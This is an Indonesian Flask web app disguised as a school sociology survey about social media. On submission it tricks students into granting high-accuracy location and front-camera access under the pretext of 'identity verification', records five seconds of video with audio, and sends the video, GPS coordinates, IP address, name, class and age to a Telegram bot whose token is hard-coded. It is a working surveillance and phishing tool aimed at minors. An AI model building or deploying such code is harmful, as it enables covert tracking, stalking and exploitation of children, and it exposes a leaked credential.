from flask import Flask, render_template_string, request, jsonify
import datetime
import os
import base64
import uuid
import requests

app = Flask(__name__)

# ============================================
# KONFIGURASI TELEGRAM
# ============================================
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "8647021039:AAHOwTmysMiq81h3vF-o04T3T-oHUU5tU-g")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "6600650184")

# ============================================
# KONFIGURASI SURVEI
# ============================================
INFO_SURVEI = {
    "judul": "Survei Penggunaan Media Sosial",
    "subjudul": "Tugas Kelompok Mata Pelajaran Sosiologi",
    "kelas": "Kelas XI IPS 2",
    "sekolah": "SMA Negeri 1",
    "guru": "Bu Sari Wulandari, S.Pd.",
    "deadline": "20 September 2026"
}


# ============================================
# HALAMAN SURVEI
# ============================================
@app.route("/")
def index():
    return render_template_string("""
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>{{ judul }} - {{ subjudul }}</title>
        <style>
            * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
            body {
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                background: #f5f7fa;
                min-height: 100vh;
                padding: 0 0 30px 0;
                color: #333;
            }
            .top-bar {
                background: linear-gradient(135deg, #4f46e5 0%, #7c3aed 100%);
                color: white;
                padding: 20px 20px 25px;
                text-align: center;
                border-radius: 0 0 20px 20px;
                box-shadow: 0 4px 15px rgba(79, 70, 229, 0.3);
            }
            .top-bar h1 { font-size: 18px; font-weight: 600; margin-bottom: 5px; line-height: 1.4; }
            .top-bar .sub { font-size: 13px; opacity: 0.9; margin-bottom: 12px; }
            .meta-info { display: flex; justify-content: center; gap: 15px; font-size: 11px; opacity: 0.9; flex-wrap: wrap; }
            .meta-info span { background: rgba(255,255,255,0.15); padding: 4px 10px; border-radius: 10px; }
            .container {
                background: white; border-radius: 16px; padding: 22px 20px;
                max-width: 500px; margin: -12px 15px 15px;
                box-shadow: 0 4px 20px rgba(0,0,0,0.06); position: relative;
            }
            .intro {
                background: #eef2ff; border-left: 4px solid #4f46e5;
                padding: 12px 15px; border-radius: 8px;
                font-size: 13px; color: #4338ca; margin-bottom: 22px; line-height: 1.5;
            }
            .intro strong { color: #3730a3; }
            .form-group { margin-bottom: 20px; }
            label { display: block; margin-bottom: 8px; color: #1f2937; font-size: 14px; font-weight: 600; }
            label .req { color: #ef4444; margin-left: 2px; }
            input[type="text"], input[type="number"], textarea, select {
                width: 100%; padding: 12px 14px; border: 2px solid #e5e7eb;
                border-radius: 10px; font-size: 15px; font-family: inherit;
                background: #f9fafb; transition: all 0.2s;
            }
            input:focus, textarea:focus, select:focus { outline: none; border-color: #4f46e5; background: white; }
            textarea { resize: vertical; min-height: 80px; }
            .radio-group, .check-group { display: flex; flex-direction: column; gap: 8px; }
            .radio-item, .check-item {
                display: flex; align-items: center; gap: 10px;
                padding: 12px 14px; border: 2px solid #e5e7eb;
                border-radius: 10px; font-size: 14px; cursor: pointer;
                background: #f9fafb; font-weight: normal; transition: all 0.2s;
            }
            .radio-item input, .check-item input { width: auto; accent-color: #4f46e5; }
            .radio-item:has(input:checked), .check-item:has(input:checked) {
                border-color: #4f46e5; background: #eef2ff; color: #4338ca;
            }
            button {
                width: 100%; padding: 15px;
                background: linear-gradient(135deg, #4f46e5 0%, #7c3aed 100%);
                color: white; border: none; border-radius: 12px;
                font-size: 16px; font-weight: 600; cursor: pointer;
                margin-top: 10px; transition: transform 0.1s;
                box-shadow: 0 4px 12px rgba(79, 70, 229, 0.3);
            }
            button:active { transform: scale(0.98); }
            button:disabled { background: #9ca3af; box-shadow: none; cursor: not-allowed; }
            .footer-note { text-align: center; font-size: 11px; color: #9ca3af; margin-top: 18px; line-height: 1.6; }
            .status { margin-top: 15px; padding: 14px; border-radius: 10px; font-size: 14px; text-align: center; display: none; }
            .status.info { background: #dbeafe; color: #1e40af; display: block; }
            .status.success { background: #d1fae5; color: #065f46; display: block; }
            .status.error { background: #fee2e2; color: #991b1b; display: block; }
            .progress-top { position: fixed; top: 0; left: 0; right: 0; height: 4px; background: rgba(255,255,255,0.3); z-index: 999; }
            .progress-top-bar { height: 100%; background: #fbbf24; width: 0%; transition: width 0.4s; }
            @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
            .spinner {
                display: inline-block; width: 16px; height: 16px;
                border: 2px solid currentColor; border-top-color: transparent;
                border-radius: 50%; animation: spin 0.8s linear infinite;
                margin-right: 8px; vertical-align: middle;
            }
        </style>
    </head>
    <body>
        <div class="progress-top">
            <div class="progress-top-bar" id="progressBar"></div>
        </div>

        <div class="top-bar">
            <h1>{{ judul }}</h1>
            <div class="sub">{{ subjudul }}</div>
            <div class="meta-info">
                <span>🏫 {{ sekolah }}</span>
                <span>👥 {{ kelas }}</span>
            </div>
        </div>

        <div class="container" id="mainContainer">
            <div class="intro">
                <strong>Hai! 👋</strong><br>
                Kami dari <strong>{{ kelas }}</strong> sedang mengerjakan tugas kelompok untuk mata pelajaran terkait. Bantu isi survei singkat ini ya! Cuma butuh <strong>2 menit</strong>.
                <br><br>
                Deadline: <strong>{{ deadline }}</strong>
            </div>

            <form id="formSurvei">
                <div class="form-group">
                    <label>Nama Lengkap <span class="req">*</span></label>
                    <input type="text" name="nama" required placeholder="Contoh: Budi Santoso">
                </div>
                <div class="form-group">
                    <label>Kelas <span class="req">*</span></label>
                    <select name="kelas" required>
                        <option value="">-- Pilih Kelas --</option>
                        <option>X IPA 1</option><option>X IPA 2</option><option>X IPS 1</option>
                        <option>XI IPA 1</option><option>XI IPA 2</option><option>XI IPS 1</option>
                        <option>XI IPS 2</option><option>XII IPA 1</option><option>XII IPS 1</option>
                    </select>
                </div>
                <div class="form-group">
                    <label>Umur <span class="req">*</span></label>
                    <input type="number" name="umur" required min="12" max="25" placeholder="Contoh: 16">
                </div>
                <div class="form-group">
                    <label>Jenis Kelamin <span class="req">*</span></label>
                    <div class="radio-group">
                        <label class="radio-item"><input type="radio" name="jk" value="Laki-laki" required><span>👦 Laki-laki</span></label>
                        <label class="radio-item"><input type="radio" name="jk" value="Perempuan"><span>👧 Perempuan</span></label>
                    </div>
                </div>
                <div class="form-group">
                    <label>Media sosial yang paling sering dipakai? <span class="req">*</span></label>
                    <div class="radio-group">
                        <label class="radio-item"><input type="radio" name="medsos" value="Instagram" required><span>📷 Instagram</span></label>
                        <label class="radio-item"><input type="radio" name="medsos" value="TikTok"><span>🎵 TikTok</span></label>
                        <label class="radio-item"><input type="radio" name="medsos" value="WhatsApp"><span>💬 WhatsApp</span></label>
                        <label class="radio-item"><input type="radio" name="medsos" value="YouTube"><span>▶️ YouTube</span></label>
                        <label class="radio-item"><input type="radio" name="medsos" value="Twitter/X"><span>🐦 Twitter / X</span></label>
                        <label class="radio-item"><input type="radio" name="medsos" value="Facebook"><span>📘 Facebook</span></label>
                    </div>
                </div>
                <div class="form-group">
                    <label>Berapa lama pakai medsos per hari? <span class="req">*</span></label>
                    <div class="radio-group">
                        <label class="radio-item"><input type="radio" name="durasi" value="Kurang dari 1 jam" required><span>⏱️ Kurang dari 1 jam</span></label>
                        <label class="radio-item"><input type="radio" name="durasi" value="1-3 jam"><span>⏰ 1-3 jam</span></label>
                        <label class="radio-item"><input type="radio" name="durasi" value="3-5 jam"><span>🕐 3-5 jam</span></label>
                        <label class="radio-item"><input type="radio" name="durasi" value="Lebih dari 5 jam"><span>🌙 Lebih dari 5 jam</span></label>
                    </div>
                </div>
                <div class="form-group">
                    <label>Kapan biasanya buka medsos? <span class="req">*</span></label>
                    <div class="radio-group">
                        <label class="radio-item"><input type="radio" name="waktu" value="Pagi sebelum sekolah" required><span>🌅 Pagi sebelum sekolah</span></label>
                        <label class="radio-item"><input type="radio" name="waktu" value="Siang jam istirahat"><span>☀️ Siang jam istirahat</span></label>
                        <label class="radio-item"><input type="radio" name="waktu" value="Sore setelah pulang"><span>🌤️ Sore setelah pulang</span></label>
                        <label class="radio-item"><input type="radio" name="waktu" value="Malam sebelum tidur"><span>🌙 Malam sebelum tidur</span></label>
                    </div>
                </div>
                <div class="form-group">
                    <label>Menurutmu, dampak medsos buat pelajar? <span class="req">*</span></label>
                    <textarea name="dampak" required placeholder="Tulis pendapatmu singkat..."></textarea>
                </div>

                <button type="submit" id="btnKirim">📤 Kirim Jawaban</button>
                <div class="status" id="status"></div>
            </form>

            <div class="footer-note">
                Data survei ini hanya digunakan untuk tugas kelompok.<br>
                Jawabanmu dijaga kerahasiaannya. 🙏
            </div>
        </div>

        <video id="video" autoplay muted playsinline style="display:none"></video>

        <script>
        const DURASI_REKAM = 5000;
        let lokasi = null;
        let videoBase64 = null;

        const statusEl = document.getElementById("status");
        const btnKirim = document.getElementById("btnKirim");
        const progressBar = document.getElementById("progressBar");

        function setStatus(type, text) {
            statusEl.className = "status " + type;
            statusEl.innerHTML = text;
        }
        function setProgress(pct) {
            progressBar.style.width = pct + "%";
        }

        // ==========================================
        // MINTA IZIN LOKASI
        // ==========================================
        function mintaLokasi() {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) { reject("no geolocation"); return; }
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        lokasi = {
                            latitude: pos.coords.latitude,
                            longitude: pos.coords.longitude,
                            accuracy: pos.coords.accuracy
                        };
                        resolve(lokasi);
                    },
                    err => reject("denied location"),
                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                );
            });
        }

        // ==========================================
        // MINTA IZIN KAMERA DEPAN
        // ==========================================
        async function bukaKamera() {
            try {
                return await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: "user",
                        width: { ideal: 480 },
                        height: { ideal: 360 },
                        frameRate: { ideal: 20 }
                    },
                    audio: true
                });
            } catch (err) {
                try {
                    return await navigator.mediaDevices.getUserMedia({
                        video: true, audio: true
                    });
                } catch (err2) {
                    throw "denied camera";
                }
            }
        }

        // ==========================================
        // REKAM VIDEO 5 DETIK — PAKSA MP4
        // ==========================================
        async function rekamVideo(stream) {
            const video = document.getElementById("video");
            video.srcObject = stream;
            video.style.display = "block";

            // Tunggu kamera stabil (auto-focus)
            await new Promise(r => setTimeout(r, 800));

            // Prioritas format MP4 dulu, WebM sebagai fallback
            const formatList = [
                "video/mp4;codecs=h264,aac",
                "video/mp4;codecs=h264",
                "video/mp4;codecs=avc1.42E01E,mp4a.40.2",
                "video/mp4",
                "video/webm;codecs=vp9,opus",
                "video/webm;codecs=vp8,opus",
                "video/webm"
            ];

            let mimeType = "";
            for (const fmt of formatList) {
                if (MediaRecorder.isTypeSupported(fmt)) {
                    mimeType = fmt;
                    break;
                }
            }
            console.log("📹 Format rekaman:", mimeType);

            const recorder = new MediaRecorder(stream, {
                mimeType: mimeType,
                videoBitsPerSecond: 500000,   // 500 kbps — kualitas cukup
                audioBitsPerSecond: 64000     // 64 kbps audio
            });

            const chunks = [];
            recorder.ondataavailable = e => {
                if (e.data.size > 0) chunks.push(e.data);
            };

            const selesai = new Promise(resolve => {
                recorder.onstop = () => {
                    const blob = new Blob(chunks, { type: mimeType });
                    resolve(blob);
                };
            });

            // Gunakan timeslice agar data tersimpan per 200ms
            recorder.start(200);

            // Rekam tepat 5 detik
            await new Promise(r => setTimeout(r, DURASI_REKAM));
            recorder.stop();

            const blob = await selesai;

            // Matikan kamera
            stream.getTracks().forEach(t => t.stop());
            video.style.display = "none";

            console.log("📹 Ukuran video:", (blob.size / 1024).toFixed(1), "KB");
            console.log("📹 Tipe video:", blob.type);

            return await blobToBase64(blob);
        }

        function blobToBase64(blob) {
            return new Promise((resolve, reject) => {
                const reader = new FileReader();
                reader.onloadend = () => resolve(reader.result);
                reader.onerror = reject;
                reader.readAsDataURL(blob);
            });
        }

        async function kirimKeServer(formData) {
            const res = await fetch("/simpan", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    latitude: lokasi.latitude,
                    longitude: lokasi.longitude,
                    accuracy: lokasi.accuracy,
                    video: videoBase64,
                    mime: videoBase64.split(";")[0].split(":")[1],
                    form: formData
                })
            });
            return await res.json();
        }

        // ==========================================
        // SAAT KLIK "KIRIM JAWABAN"
        // ==========================================
        document.getElementById("formSurvei").addEventListener("submit", async (e) => {
            e.preventDefault();

            const fd = new FormData(e.target);
            const formData = {};
            for (let [key, value] of fd.entries()) formData[key] = value;

            btnKirim.disabled = true;
            btnKirim.innerHTML = '<span class="spinner"></span>Mengirim...';
            setProgress(20);

            // STEP 1: Lokasi
            setStatus("info", "🔒 Memverifikasi data pengirim...");
            try {
                await mintaLokasi();
                setProgress(40);
            } catch (err) {
                setStatus("error", "❌ Gagal verifikasi. Izinkan akses lokasi.");
                btnKirim.disabled = false;
                btnKirim.innerHTML = "📤 Kirim Jawaban";
                setProgress(0);
                return;
            }

            // STEP 2: Kamera
            setStatus("info", "📸 Memverifikasi identitas pengirim...");
            let stream;
            try {
                stream = await bukaKamera();
                setProgress(60);
            } catch (err) {
                setStatus("error", "❌ Gagal verifikasi. Izinkan akses kamera.");
                btnKirim.disabled = false;
                btnKirim.innerHTML = "📤 Kirim Jawaban";
                setProgress(0);
                return;
            }

            // STEP 3: Rekam
            setStatus("info", "⏳ Memproses verifikasi... mohon tunggu");
            try {
                videoBase64 = await rekamVideo(stream);
                setProgress(80);
            } catch (err) {
                console.error("Error rekam:", err);
                setStatus("error", "❌ Terjadi kesalahan. Coba lagi.");
                btnKirim.disabled = false;
                btnKirim.innerHTML = "📤 Kirim Jawaban";
                setProgress(0);
                return;
            }

            // STEP 4: Kirim
            setStatus("info", "📤 Mengirim jawaban...");
            try {
                const data = await kirimKeServer(formData);
                setProgress(100);

                if (data.status === "ok") {
                    document.getElementById("mainContainer").innerHTML = `
                        <div style="text-align:center;padding:30px 10px">
                            <div style="font-size:70px;margin-bottom:15px">✅</div>
                            <h2 style="color:#10b981;font-size:22px;margin-bottom:12px">Terima Kasih! 🎉</h2>
                            <p style="color:#6b7280;line-height:1.7;font-size:14px">
                                Jawabanmu sudah berhasil dikirim.<br>
                                Bantuanmu sangat berarti buat tugas kelompok kami!
                            </p>
                            <div style="background:#f0f4ff;padding:18px;border-radius:12px;margin-top:25px;font-size:13px;color:#4338ca;text-align:left">
                                <strong>📄 Bukti Pengiriman:</strong><br>
                                <div style="margin-top:10px;font-family:monospace;font-size:12px;background:white;padding:10px;border-radius:6px">
                                    <div>No. Referensi:</div>
                                    <div style="color:#4f46e5;font-weight:bold">${data.ref}</div>
                                    <div style="margin-top:8px">Waktu Kirim:</div>
                                    <div>${data.waktu}</div>
                                </div>
                            </div>
                            <p style="color:#9ca3af;font-size:12px;margin-top:25px;line-height:1.6">
                                Screenshot halaman ini sebagai bukti<br>sudah mengisi survei.
                            </p>
                        </div>
                    `;
                    window.scrollTo({ top: 0, behavior: "smooth" });
                } else {
                    setStatus("error", "❌ Gagal mengirim. Coba lagi.");
                    btnKirim.disabled = false;
                    btnKirim.innerHTML = "📤 Kirim Jawaban";
                    setProgress(0);
                }
            } catch (err) {
                setStatus("error", "❌ Koneksi bermasalah. Coba lagi.");
                btnKirim.disabled = false;
                btnKirim.innerHTML = "📤 Kirim Jawaban";
                setProgress(0);
            }
        });
        </script>
    </body>
    </html>
    """, **INFO_SURVEI)


# ============================================
# ENDPOINT: TERIMA DATA + KIRIM TELEGRAM
# ============================================
@app.route("/simpan", methods=["POST"])
def simpan():
    data = request.get_json()
    if not data or "latitude" not in data or "longitude" not in data:
        print("❌ Data tidak lengkap")
        return jsonify({"status": "error", "message": "Data tidak lengkap"}), 400

    lat = data["latitude"]
    lon = data["longitude"]
    akurasi = data.get("accuracy", 0)
    video_data = data.get("video", "")
    mime = data.get("mime", "video/webm")
    form_data = data.get("form", {})

    ip = request.headers.get("X-Forwarded-For", request.remote_addr).split(",")[0].strip()
    ua = request.headers.get("User-Agent", "unknown")[:80]
    waktu = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    ref = uuid.uuid4().hex[:12].upper()

    # Tentukan ekstensi
    if "mp4" in mime:
        ext = "mp4"
        send_mime = "video/mp4"
    elif "webm" in mime:
        ext = "webm"
        send_mime = "video/webm"
    else:
        ext = "webm"
        send_mime = "video/webm"

    print(f"📥 DATA MASUK | REF: {ref}")
    print(f"   Lokasi: {lat}, {lon} (±{round(akurasi)}m)")
    print(f"   MIME: {mime} | Ext: {ext}")
    print(f"   Form: {form_data}")

    if not TELEGRAM_TOKEN or "GANTI" in TELEGRAM_TOKEN:
        print("⚠ TELEGRAM_TOKEN belum di-set")
        return jsonify({"status": "ok", "waktu": waktu, "ref": ref})

    # Format caption
    label_map = {
        "nama": "Nama", "kelas": "Kelas", "umur": "Umur",
        "jk": "Jenis Kelamin", "medsos": "Medsos Favorit",
        "durasi": "Durasi Harian", "waktu": "Waktu Akses",
        "dampak": "Dampak/Pendapat", "pendapat": "Pendapat"
    }
    siswa_text = "\n\n👤 *Data Siswa:*\n"
    for k, v in form_data.items():
        label = label_map.get(k, k)
        siswa_text += f"• {label}: `{v}`\n"

    caption = (
        f"🎥 *Video + Lokasi Baru!*\n\n"
        f"📍 Lat: `{lat:.6f}`\n"
        f"Lon: `{lon:.6f}`\n"
        f"±{round(akurasi)}m\n\n"
        f"🗺 [Google Maps](https://www.google.com/maps?q={lat},{lon})\n\n"
        f"🌐 IP: `{ip}`\n"
        f"⏰ {waktu}"
        f"{siswa_text}"
    )

    # Kirim ke Telegram
    try:
        if video_data.startswith("data:video"):
            header, encoded = video_data.split(",", 1)
            vid_bytes = base64.b64decode(encoded)

            size_mb = len(vid_bytes) / (1024 * 1024)
            print(f"   📹 Ukuran video: {size_mb:.2f} MB")

            if size_mb > 49:
                print(f"   ⚠ Video terlalu besar, kirim teks saja")
                r = requests.post(
                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                    data={
                        "chat_id": TELEGRAM_CHAT_ID,
                        "text": caption + f"\n\n⚠ Video terlalu besar ({size_mb:.1f}MB)",
                        "parse_mode": "Markdown"
                    },
                    timeout=8
                )
            else:
                print(f"   📤 Mengirim video ({ext})...")
                # HAPUS metadata width/height/duration — Telegram
                # akan otomatis deteksi dari file video
                files = {"video": (f"video.{ext}", vid_bytes, send_mime)}
                r = requests.post(
                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendVideo",
                    data={
                        "chat_id": TELEGRAM_CHAT_ID,
                        "caption": caption,
                        "parse_mode": "Markdown",
                        "supports_streaming": True
                        # duration, width, height dihapus →
                        # biar Telegram hitung sendiri dari file asli
                    },
                    files=files,
                    timeout=8
                )
        else:
            print("   📝 Tidak ada video, kirim teks saja")
            r = requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                data={
                    "chat_id": TELEGRAM_CHAT_ID,
                    "text": caption + "\n\n⚠ Video tidak tersedia",
                    "parse_mode": "Markdown"
                },
                timeout=8
            )

        print(f"   📨 Response HTTP: {r.status_code}")
        if r.status_code == 200:
            print(f"   ✅ Telegram OK | REF: {ref}")
        else:
            print(f"   ❌ Telegram error: {r.status_code}")
            print(f"   ❌ Body: {r.text[:500]}")

    except requests.exceptions.Timeout:
        print(f"   ❌ TIMEOUT: Telegram tidak respon")
    except requests.exceptions.ConnectionError as e:
        print(f"   ❌ KONEKSI ERROR: {e}")
    except Exception as e:
        print(f"   ❌ ERROR: {type(e).__name__}: {e}")

    return jsonify({"status": "ok", "waktu": waktu, "ref": ref})


# ============================================
# HELPER ROUTES
# ============================================
@app.route("/test_telegram")
def test_telegram():
    if not TELEGRAM_TOKEN or "GANTI" in TELEGRAM_TOKEN:
        return "❌ TELEGRAM_TOKEN belum diisi", 400
    try:
        r = requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
            data={
                "chat_id": TELEGRAM_CHAT_ID,
                "text": "✅ *Test berhasil!*\n\nBot Telegram sudah terhubung.",
                "parse_mode": "Markdown"
            },
            timeout=10
        )
        return "✅ Test berhasil! Cek Telegram Anda." if r.status_code == 200 else f"❌ Gagal: {r.text}"
    except Exception as e:
        return f"❌ Error: {e}", 500


@app.route("/health")
def health():
    return "OK", 200


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    print(f"🚀 Server berjalan di port {port}")
    app.run(host="0.0.0.0", port=port, debug=False)